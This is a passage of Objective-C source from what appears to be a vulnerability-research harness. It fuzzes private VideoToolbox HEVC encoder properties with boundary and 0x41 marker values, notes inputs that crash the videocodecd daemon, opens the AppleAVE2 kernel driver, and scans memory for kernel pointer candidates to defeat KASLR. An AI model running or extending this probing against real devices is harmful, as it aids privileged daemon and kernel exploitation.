        // а также предварительную установку UserParameterSetsIds и ChromaQPIndexOffsetMultiPPS.
        NSMutableArray *s0s = [NSMutableArray array], *s1s = [NSMutableArray array];
        NSMutableArray *u0Num = [NSMutableArray array], *u1Num = [NSMutableArray array];
        for (int i = 0; i < 2; i++) {
            [s0s addObject:@(i)];
            [s1s addObject:@(i)];
            [u0Num addObject:@1];
            [u1Num addObject:@1];
        }
        NSMutableArray *s0Pad16 = [NSMutableArray arrayWithCapacity:16];
        NSMutableArray *s1Pad16 = [NSMutableArray arrayWithCapacity:16];
        NSMutableArray *u0Pad16 = [NSMutableArray arrayWithCapacity:16];
        NSMutableArray *u1Pad16 = [NSMutableArray arrayWithCapacity:16];
        for (int i = 0; i < 16; i++) {
            [s0Pad16 addObject:@(i < 2 ? i : 0)];
            [s1Pad16 addObject:@(i < 1 ? i : 0)];
            [u0Pad16 addObject:@(i < 2 ? 1 : 0)];
            [u1Pad16 addObject:@(i < 1 ? 1 : 0)];
        }
        NSDictionary *rpsNumArr = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @2,
            @"NumPositivePics": @1,
            @"DeltaPocS0Minus1": s0s,
            @"UsedByCurrPicS0": u0Num,
            @"DeltaPocS1Minus1": s1s,
            @"UsedByCurrPicS1": u1Num,
        };
        NSDictionary *rpsNumArr0 = @{
            @"InterRefPicSetPredictionFlag": @0,
            @"NumNegativePics": @2,
            @"NumPositivePics": @1,
            @"DeltaPocS0Minus1": s0s,
            @"UsedByCurrPicS0": u0Num,
            @"DeltaPocS1Minus1": s1s,
            @"UsedByCurrPicS1": u1Num,
        };
        NSDictionary *rpsPad16 = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @2,
            @"NumPositivePics": @1,
            @"DeltaPocS0Minus1": s0Pad16,
            @"UsedByCurrPicS0": u0Pad16,
            @"DeltaPocS1Minus1": s1Pad16,
            @"UsedByCurrPicS1": u1Pad16,
        };

        OSStatus stPsIds2 = VTSessionSetProperty(s, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @0, @1 ]);
        OSStatus stPsIds4 = VTSessionSetProperty(s, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @0, @1, @2, @3 ]);
        CFTypeRef psIdsRb = NULL;
        CFIndex psIdsRbCnt = -1;
        if (VTSessionCopyProperty(s, CFSTR("UserParameterSetsIds"), kCFAllocatorDefault, &psIdsRb) == noErr && psIdsRb) {
            if (CFGetTypeID(psIdsRb) == CFArrayGetTypeID()) psIdsRbCnt = CFArrayGetCount((CFArrayRef)psIdsRb);
            CFRelease(psIdsRb);
        }
        OSStatus stPreNumArr  = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsNumArr]);
        OSStatus stPreNumArr0 = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsNumArr0]);
        OSStatus stPrePad16   = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsPad16]);
        KPH9OutAppend(out, @"  set UserRPS @pre (psIds2=%d psIds4=%d rbPs=%ld): numArr=%d numArr0=%d pad16=%d\n",
                      (int)stPsIds2, (int)stPsIds4, (long)psIdsRbCnt, (int)stPreNumArr, (int)stPreNumArr0, (int)stPrePad16);

        int cqpCounts[] = { 4, 16, 17, 32 };
        NSMutableArray *cqpParts = [NSMutableArray array];
        for (int ci = 0; ci < 4; ci++) {
            int cn = cqpCounts[ci];
            NSMutableArray *zeros = [NSMutableArray arrayWithCapacity:(NSUInteger)cn];
            for (int k = 0; k < cn; k++) [zeros addObject:@"0"];
            NSString *cqpStr = [zeros componentsJoinedByString:@" "];
            OSStatus cqpSt = VTSessionSetProperty(s, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpStr);
            [cqpParts addObject:[NSString stringWithFormat:@"n%d=%d", cn, (int)cqpSt]];
        }
        KPH9OutAppend(out, @"  ChromaQPIndexOffsetMultiPPS @pre: %@\n", [cqpParts componentsJoinedByString:@" "]);

        OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
        KPH9OutAppend(out, @"  prepare -> %d\n", (int)prep);

        OSStatus stSane  = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsNumArr]);
        OSStatus stArr0  = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsNumArr0]);
        OSStatus stPad16 = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsPad16]);
        CFTypeRef rpsRb = NULL;
        OSStatus rpsCopySt = VTSessionCopyProperty(s, CFSTR("UserRPSForFaceTime"), kCFAllocatorDefault, &rpsRb);
        CFIndex rpsRbCount = (rpsCopySt == noErr && rpsRb && CFGetTypeID(rpsRb) == CFArrayGetTypeID())
                             ? CFArrayGetCount((CFArrayRef)rpsRb) : -1;
        if (rpsRb) CFRelease(rpsRb);
        KPH9OutAppend(out, @"  session set UserRPS @post-prep: numArr=%d numArr0=%d pad16=%d rbCount=%ld\n",
                      (int)stSane, (int)stArr0, (int)stPad16, (long)rpsRbCount);

        CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
        if (pb) {
            @synchronized (cbSink) { [cbSink removeAllObjects]; }
            OSStatus e0 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
            if (e0 == noErr) KPH9Drain(cbSink, 1, 60);
            NSString *cb0 = nil;
            @synchronized (cbSink) { cb0 = cbSink.firstObject ?: @"(no cb)"; [cbSink removeAllObjects]; }
            OSStatus stSanePost  = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsNumArr]);
            OSStatus stPad16Post = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsPad16]);
            KPH9OutAppend(out, @"  encode[0] clean IDR -> %d (%@) | set UserRPS @post-idr numArr=%d pad16=%d\n",
                          (int)e0, cb0, (int)stSanePost, (int)stPad16Post);

            NSDictionary *fp = @{
                @"UserRPSForFaceTime": @[rpsPad16],
                @"ForceSliceRPS": (id)kCFBooleanTrue,
            };
            OSStatus e1 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(1, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
            // Push 4 trailing P-frames (pts 2..5) BEFORE draining so pts=1 exits the
            // 4-frame HEVC B-pyramid reorder window instead of returning (no cb).
            OSStatus e2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(2, 30), kCMTimeInvalid, NULL, NULL, NULL);
            OSStatus e3 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(3, 30), kCMTimeInvalid, NULL, NULL, NULL);
            VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(4, 30), kCMTimeInvalid, NULL, NULL, NULL);
            VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(5, 30), kCMTimeInvalid, NULL, NULL, NULL);
            if (e1 == noErr || e2 == noErr || e3 == noErr) KPH9Drain(cbSink, 2, 160);
            NSString *cb1 = nil, *cb2 = nil;
            @synchronized (cbSink) {
                cb1 = cbSink.firstObject ?: @"(no cb)";
                if (cbSink.count > 1) {
                    NSArray *rest = [cbSink subarrayWithRange:NSMakeRange(1, cbSink.count - 1)];
                    cb2 = [rest componentsJoinedByString:@" | "];
                } else {
                    cb2 = @"(no cb)";
                }
            }
            KPH9OutAppend(out, @"  encode[1] frameProps RPS+ForceSliceRPS -> %d (%@)\n", (int)e1, cb1);
            KPH9OutAppend(out, @"  encode[2..3] trailing P-frames -> %d/%d (%@)\n", (int)e2, (int)e3, cb2);
            CVPixelBufferRelease(pb);
        }

        KPH9SafeTeardownEx(s, retainedSink, NULL);
    });
    [report appendString:s1];

    // -------------------------------------------------------------------------
    // Stage 2: NumberOfTemporalLayers (NTL) Unclamp & Steered x0 Audit
    //   2A: with ExpectedFrameRate=60 / BaseLayerFrameRate=15 (dyadic clamp -> 3)
    //   2B: raw EncoderUsage=1 without BaseLayerFrameRate (unclamped readback)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 2: NTL unclamp & steered x0 (60/15 clamped vs raw unclamped)"];
    [report appendString:@"\n--- Stage 2: NTL Unclamp & Steered x0 Audit ---\n"];
    if (vtHung) {
        [report appendString:@"  skipped (videocodecd XPC unresponsive)\n"];
    } else {
        NSString *s2 = KPH9RunTimed(@"Stage2-NTL", 5000, &vtHung, ^(NSMutableString *out) {
            CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
            int ntlVals[] = { 3, 8, 16000, 16447 };
            KPH9OutAppend(out, @"  [2A: with ExpectedFrameRate=60 / BaseLayerFrameRate=15 -> dyadic clamp 1+log2(60/15)=3]\n");
            for (int i = 0; i < 4; i++) {
                int ntl = ntlVals[i];
                uint64_t x0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
                // 1) Usage=1 dyadic clamp readback
                int pre = -1, post = -1;
                OSStatus prep = -999;
                {
                    NSDictionary *spec = @{
                        @"EncoderUsage": @1,
                        @"NumberOfTemporalLayers": @(ntl),
                        @"AllowTemporalCompression": @YES,
                    };
                    VTCompressionSessionRef us = NULL;
                    if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                   kCMVideoCodecType_HEVC,
                                                   (__bridge CFDictionaryRef)spec,
                                                   NULL, NULL, NULL, NULL, &us) == noErr && us) {
                        VTSessionSetProperty(us, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                        VTSessionSetProperty(us, CFSTR("RealTime"), kCFBooleanTrue);
                        VTSessionSetProperty(us, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
                        VTSessionSetProperty(us, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
                        VTSessionSetProperty(us, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
                        VTSessionSetProperty(us, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                        CFNumberRef rb = NULL;
                        if (VTSessionCopyProperty(us, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                            CFNumberGetValue(rb, kCFNumberIntType, &pre);
                            CFRelease(rb);
                        }
                        prep = VTCompressionSessionPrepareToEncodeFrames(us);
                        rb = NULL;
                        if (VTSessionCopyProperty(us, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                            CFNumberGetValue(rb, kCFNumberIntType, &post);
                            CFRelease(rb);
                        }
                        KPH9SafeTeardown(us);
                    }
                }
                // 2) Usage=0 non-realtime 60/15 encode so cb#1 st=0 dumps actual VPS/SPS for 60/15
                Stage6ProbeResult *res = Stage6AllocResult();
                if (!res) continue;
                VTCompressionSessionRef s = NULL;
                OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                         kCMVideoCodecType_HEVC,
                                                         NULL, NULL, NULL, Stage6OutputCallback, res, &s);
                if (st != noErr || !s) {
                    KPH9OutAppend(out, @"  60/15 NTL=%-5d create=%d\n", ntl, (int)st);
                    free(res);
                    continue;
                }
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                VTCompressionSessionPrepareToEncodeFrames(s);
                int u0Post = -1;
                CFNumberRef rb0 = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb0) == noErr && rb0) {
                    CFNumberGetValue(rb0, kCFNumberIntType, &u0Post);
                    CFRelease(rb0);
                }
                OSStatus enc = -1;
                if (pb) {
                    enc = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    int w0 = 0;
                    while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                }
                @synchronized ([KPH9EncoderModule class]) {
                    res->closed = 1;
                    KPH9OutAppend(out, @"  60/15 NTL=%-5d x0=0x%016llx prep=%d PRE=%d POST=%d(u0=%d) enc=%d | %s\n",
                                  ntl, x0, (int)prep, pre, post, u0Post, (int)enc, res->first);
                }
                KPH9SafeTeardownEx(s, NULL, res);
            }

            KPH9OutAppend(out, @"  [2B: raw EncoderUsage=1 without BaseLayerFrameRate (IOSurface-backed pb, RealTime=YES)]\n");
            int rawVals[] = { 2, 3, 4, 7, 8, 16000, 16447, 16462 };
            for (int i = 0; i < 8; i++) {
                int ntl = rawVals[i];
                uint64_t x0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
                Stage6ProbeResult *res = Stage6AllocResult();
                if (!res) continue;
                VTCompressionSessionRef s = NULL;
                OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                         kCMVideoCodecType_HEVC,
                                                         NULL, NULL, NULL,
                                                         Stage6OutputCallback, res, &s);
                if (st != noErr || !s) {
                    KPH9OutAppend(out, @"  raw   NTL=%-5d create=%d\n", ntl, (int)st);
                    free(res);
                    continue;
                }
                OSStatus uSt = VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(s, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                OSStatus nSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                int pre = -1, post = -1, postEnc = -1;
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &pre);
                    CFRelease(rb);
                }
                OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
                rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &post);
                    CFRelease(rb);
                }
                NSString *encStr = @"deferred";
                if (pb && ntl <= 8) {
                    OSStatus enc = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    int w0 = 0;
                    while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                    rb = NULL;
                    if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                        CFNumberGetValue(rb, kCFNumberIntType, &postEnc);
                        CFRelease(rb);
                    }
                    encStr = [NSString stringWithFormat:@"%d(POST_ENC=%d)", (int)enc, postEnc];
                }
                @synchronized ([KPH9EncoderModule class]) {
                    res->closed = 1;
                    KPH9OutAppend(out, @"  raw   NTL=%-5d x0=0x%016llx usage=%d set=%d PRE=%d prep=%d POST=%d enc=%@ | %s\n",
                                  ntl, x0, (int)uSt, (int)nSt, pre, (int)prep, post, encStr, res->first);
                }
                KPH9SafeTeardownEx(s, NULL, res);
            }

            KPH9OutAppend(out, @"  [2C: extcal Dyadic VPS/SPS Ladder (ExpectedFPS=15*2^(NTL-1) / BaseFPS=15, RealTime=NO)]\n");
            int extNtls[] = { 1, 2, 3, 4, 5, 6, 7, 8 };
            for (int ri = 0; ri < 8; ri++) {
                int ntl = extNtls[ri];
                int expFps = 15 * (1 << (ntl - 1));
                int baseFps = 15;
                Stage6ProbeResult *res = Stage6AllocResult();
                if (!res) continue;
                VTCompressionSessionRef s = NULL;
                if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                               kCMVideoCodecType_HEVC,
                                               NULL, NULL, NULL,
                                               Stage6OutputCallback, res, &s) == noErr && s) {
                    VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                    VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                    VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                    VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@(expFps));
                    VTSessionSetProperty(s, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@(baseFps));
                    OSStatus nSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                    OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
                    int post = -1;
                    CFNumberRef rb = NULL;
                    if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                        CFNumberGetValue(rb, kCFNumberIntType, &post);
                        CFRelease(rb);
                    }
                    OSStatus enc = -1;
                    if (pb) {
                        enc = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                        int w0 = 0;
                        while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                    }
                    @synchronized ([KPH9EncoderModule class]) {
                        res->closed = 1;
                        KPH9OutAppend(out, @"  ext   NTL=%-2d (%4d/%2d) ntlSet=%d prep=%d POST=%d enc=%d | %s\n",
                                      ntl, expFps, baseFps, (int)nSt, (int)prep, post, (int)enc, res->first);
                    }
                    KPH9SafeTeardownEx(s, NULL, res);
                } else {
                    free(res);
                }
            }
            if (pb) CVPixelBufferRelease(pb);
        });
        [report appendString:s2];
    }

    // -------------------------------------------------------------------------
    // Stage 3: UserDPBFramesForFaceTime CFNumber Slot & Cutoff Audit
    // (Strictly CFNumber elements — NSData/NSDictionary trigger uncaught
    // -[_getValue:forType:] SIGABRT in videocodecd -> launchd 320s throttle)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 3: UserDPBFramesForFaceTime CFNumber probe (32..64 boundary)"];
    [report appendString:@"\n--- Stage 3: UserDPBFramesForFaceTime (CFNumber Safe Probe) ---\n"];
    if (vtHung) {
        [report appendString:@"  skipped (videocodecd XPC unresponsive)\n"];
    } else {
        NSString *s3 = KPH9RunTimed(@"Stage3-DPB", 15000, &vtHung, ^(NSMutableString *out) {
            NSMutableArray *cbSink = [NSMutableArray array];
            CFTypeRef retainedSink = CFRetain((__bridge CFTypeRef)cbSink);
            NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
            VTCompressionSessionRef s = NULL;
            OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                     kCMVideoCodecType_HEVC,
                                                     (__bridge CFDictionaryRef)spec,
                                                     NULL, NULL, KPH9AttsCB,
                                                     (void *)retainedSink, &s);
            if (st != noErr || !s) {
                KPH9OutAppend(out, @"  session create -> %d\n", (int)st);
                CFRelease(retainedSink);
                return;
            }
            VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
            KPH9PrimeRealTime(s);
            VTCompressionSessionPrepareToEncodeFrames(s);

            CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
            int64_t pts = 0;
            if (pb) {
                @synchronized (cbSink) { [cbSink removeAllObjects]; }
                // Prime IDR (pts=0) + first 4-frame B-pyramid sub-GOP (pts=1..4) so subsequent
                // 2-frame probes never stall in lookahead with cb=(no cb).
                for (int warm = 0; warm < 5; warm++) {
                    VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
                }
                KPH9Drain(cbSink, 5, 120);
            }

            // Analyst strike 2/3: full 17..32 matrix + exact cutoff 32..64,
            // each row tested on TWO P-frames (DPB matching bites beyond IDR).
            int counts[] = { 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28,
                             29, 30, 31, 32, 33, 34, 48, 63, 64 };
            int nCounts = (int)(sizeof(counts) / sizeof(counts[0]));
            for (int ci = 0; ci < nCounts; ci++) {
                int n = counts[ci];
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
                for (int k = 0; k < n; k++) [arr addObject:@(k)];
                OSStatus sp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
                OSStatus fe = -1, fe2 = -1;
                if (pb) {
                    @synchronized (cbSink) { [cbSink removeAllObjects]; }
                    NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
                    fe = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                         (__bridge CFDictionaryRef)fp, NULL, NULL);
                    fe2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
                    if (fe == noErr || fe2 == noErr) KPH9Drain(cbSink, 2, 80);
                }
                NSString *cb = nil;
                @synchronized (cbSink) {
                    cb = cbSink.count ? [cbSink componentsJoinedByString:@" | "] : @"(no cb)";
                }
                KPH9OutAppend(out, @"  dpb[num0 x%-2d] set=%d enc=%d/%d cb=%@\n", n, (int)sp, (int)fe, (int)fe2, cb);
            }

            long long vals[] = { 15, 16, 32, -1, 0x4141414141414141LL };
            for (int vi = 0; vi < 5; vi++) {
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:16];
                for (int k = 0; k < 16; k++) [arr addObject:@(vals[vi])];
                OSStatus sp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
                OSStatus fe = -1, fe2 = -1;
                if (pb) {
                    @synchronized (cbSink) { [cbSink removeAllObjects]; }
                    NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
                    fe = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                         (__bridge CFDictionaryRef)fp, NULL, NULL);
                    fe2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
                    if (fe == noErr || fe2 == noErr) KPH9Drain(cbSink, 2, 80);
                }
                NSString *cb = nil;
                @synchronized (cbSink) {
                    cb = cbSink.count ? [cbSink componentsJoinedByString:@" | "] : @"(no cb)";
                }
                KPH9OutAppend(out, @"  dpb[val=0x%llx x16] set=%d enc=%d/%d cb=%@\n", vals[vi], (int)sp, (int)fe, (int)fe2, cb);
            }

            if (pb) CVPixelBufferRelease(pb);
            KPH9SafeTeardownEx(s, retainedSink, NULL);
        });
        [report appendString:s3];
    }

    // -------------------------------------------------------------------------
    // Stage 4: Direct AppleAVE2 IOKit UserClient Check
    // -------------------------------------------------------------------------
    [self journal:@"Stage 4: Direct AppleAVE2 IOKit probe"];
    [report appendString:@"\n--- Stage 4: Direct AppleAVE2 IOKit Probe ---\n"];
    kp_io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2"));
    [report appendFormat:@"  AppleAVE2 service=%u\n", svc];
    if (svc) {
        kp_io_connect_t conn = 0;
        kern_return_t ok = IOServiceOpen(svc, (unsigned int)mach_task_self(), 0, &conn);
        [report appendFormat:@"  IOServiceOpen -> 0x%x (conn=%u)\n", ok, conn];
        if (ok == KERN_SUCCESS && conn) {
            IOServiceClose(conn);
        }
        IOObjectRelease(svc);
    } else {
        [report appendString:@"  AppleAVE2 not exposed to sandbox\n"];
    }

    // -------------------------------------------------------------------------
    // Stage 5: Safe VM / KASLR Candidate Scan (vm_read_overwrite)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 5: Safe VM candidate scan"];
    [report appendString:@"\n--- Stage 5: Safe VM / KASLR Candidate Scan ---\n"];
    vm_address_t addr = 0;
    vm_size_t size = 0;
    uint32_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
    uint64_t pageBuf[512];
    vm_address_t exclAddr = (vm_address_t)pageBuf;
    vm_size_t exclSize = sizeof(pageBuf);
    int candidates = 0;
    uint64_t sampleCands[8] = {0};
    int sampleCount = 0;
    for (int iter = 0; iter < 4096 && candidates < 64; iter++) {
        count = VM_REGION_SUBMAP_INFO_COUNT_64;
        if (vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
                                 (vm_region_recurse_info_t)&info, &count) != KERN_SUCCESS || size == 0) {
            break;
        }
        if (info.is_submap) {
            depth++;
            continue;
        }
        if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
            size <= 16 * 1024 * 1024 &&
            !KPVMShouldSkipRegion(&info, addr, size, &depth, &exclAddr, &exclSize, 1)) {
            for (vm_size_t off = 0; off + sizeof(pageBuf) <= size && candidates < 64; off += sizeof(pageBuf)) {
                vm_size_t outSz = 0;
                if (vm_read_overwrite(mach_task_self(), addr + off, sizeof(pageBuf),
                                      (vm_address_t)pageBuf, &outSz) != KERN_SUCCESS ||
                    outSz < sizeof(uint64_t)) {
                    break;
                }
                size_t words = outSz / sizeof(uint64_t);
                for (size_t w = 0; w < words && candidates < 64; w++) {
                    uint64_t v = pageBuf[w];
                    if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                        if (sampleCount < 8) sampleCands[sampleCount++] = v;
                        candidates++;
                    }
                }
            }
        }
        if (addr + size <= addr) break;
        addr += size;
    }
    [report appendFormat:@"  filtered kernel pointer candidates: %d\n", candidates];
    for (int si = 0; si < sampleCount; si++) {
        [report appendFormat:@"    cand[%d] = 0x%016llx\n", si, sampleCands[si]];
    }

    // -------------------------------------------------------------------------
    // Stage 6: XPC bitstream / NAL / attachments leak + exact DPB boundary
    // -------------------------------------------------------------------------
    [self journal:@"Stage 6: XPC bitstream leak & DPB boundary"];
    if (vtHung) {
        [report appendString:@"\n--- Stage 6 skipped (videocodecd XPC unresponsive) ---\n"];
    } else {
        NSString *s6 = KPH9RunTimed(@"Stage6-XPC", 15000, &vtHung, ^(NSMutableString *out) {
            RunStage6_XPCLeakAndBoundaryAudit(out);
        });
        [report appendString:s6];
    }

    // -------------------------------------------------------------------------
    // Stage 7: -17691 malfunction matrix + UserRPS container ladder
    // -------------------------------------------------------------------------
    [self journal:@"Stage 7: -17691 matrix + UserRPS containers"];
    if (vtHung) {
        [report appendString:@"\n--- Stage 7 skipped (videocodecd XPC unresponsive) ---\n"];
    } else {
        NSString *s7 = KPH9RunTimed(@"Stage7-Matrix", 25000, &vtHung, ^(NSMutableString *out) {
            RunStage7_MalfunctionMatrix(out);
        });
        [report appendString:s7];
    }

    [report appendFormat:@"\nVERDICT: %@\n", vtHung ? @"VIDEOCODECD_XPC_TIMEOUT (reboot device to clear wedged daemon)" : @"COMPLETED_CLEAN"];

    [self journal:@"=== H9 clean rebuild complete ==="];
    return report;
}

@end
